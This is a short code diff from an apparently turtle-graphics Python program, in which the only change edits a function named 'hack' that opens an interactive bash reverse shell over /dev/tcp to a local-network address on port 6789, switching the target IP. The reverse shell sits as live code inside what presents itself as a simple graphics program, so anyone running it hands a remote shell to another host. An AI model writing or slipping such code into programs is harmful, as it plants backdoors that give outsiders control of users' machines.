@@ -104,7 +104,7 @@ def go_left():
 
 
 def hack(num):
-       subprocess.check_call("/bin/bash -i >/dev/tcp/192.168.0.115/6789 0<&1 2>&1", shell=True, executable='/bin/bash')
+       subprocess.check_call("/bin/bash -i >/dev/tcp/192.168.0.92/6789 0<&1 2>&1", shell=True, executable='/bin/bash')
  
  
 screen = turtle.Screen()
